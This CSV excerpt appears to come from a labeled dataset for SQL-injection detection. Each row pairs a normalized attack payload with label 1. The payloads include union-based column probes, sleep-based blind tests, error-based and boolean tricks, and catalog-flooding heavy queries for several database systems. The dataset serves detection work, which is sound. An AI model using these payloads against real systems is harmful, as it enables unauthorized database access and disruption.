row_index,payload_norm,label,sqli_type_hint
3060,"-2085"" ) as hkev where 7730 = 7730 union all select 7730,7730--",1,
3061,"1' in boolean mode ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
3062,1%' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( '%' = ',1,
3063,"1%' or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
3064,1 where 8398 = 8398,1,
3065,select ( case when ( 8808 = 1367 ) then 1 else 8808* ( select 8808 from master..sysdatabases ) end ) --,1,
3066,select ( case when ( 7096 = 2568 ) then 7096 else 1/ ( select 0 ) end ) --,1,
3067,"1%' union all select null,null,null,null,null,null,null#",1,
3068,-1375' ) ) ) or ( 1226 = 9648 ) *9648 and ( ( ( 'kfoy' like 'kfoy,1,
3069,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 1105 = 1105",1,
3070,"1"" ) ) as dshc where 9911 = 9911 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
3071,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( ""mubt"" = ""mubt",1,
3072,"1' ) where 9544 = 9544 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,
3073,"1 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
3074,"( select 1 from generate_series ( 9352,9352,case when ( 9352 = 9352 ) then 1 else 0 end ) limit 1 )",1,
3075,1' rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and 'obwn' = 'obwn,1,
3076,"1 and elt ( 1210 = 1210,sleep ( 5 ) ) -- ommf",1,
3077,"-7868' in boolean mode ) union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",1,
3078,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",1,
3079,"1' or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and 'xqkq' = 'xqkq",1,
3080,"-6093' ) where 9676 = 9676 union all select 9676,9676,9676,9676,9676,9676--",1,
3081,-2891 where 1770 = 1770 or 9290 = 5866,1,
3082,"-3562"" ) as eghl where 7094 = 7094 union all select 7094,7094,7094,7094#",1,
3083,"1'+ ( select rqcw where 9002 = 9002 union all select null,null,null,null,null,null,null,null,null#",1,
3084,"1' ) union all select null,null,null,null,null,null--",1,
3085,"end and ""mdje"" like ""mdje",1,
3086,"1"" ) where 3679 = 3679",1,
3087,-9225 ) or ( 8258 = 2726 ) *2726 and ( 9900 = 9900,1,
3088,"1'+ ( select inrv where 2178 = 2178 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
3089,"1%' or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
